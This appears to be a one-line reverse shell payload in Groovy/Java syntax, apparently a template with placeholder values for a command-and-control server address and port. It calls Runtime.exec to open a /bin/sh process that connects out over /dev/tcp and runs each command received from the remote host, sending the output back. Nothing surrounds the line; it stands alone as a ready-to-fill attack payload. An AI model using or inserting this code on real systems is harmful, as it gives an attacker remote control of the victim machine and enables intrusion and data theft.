r = Runtime.getRuntime();p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/XX_CC_SERVER_IP/XX_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor();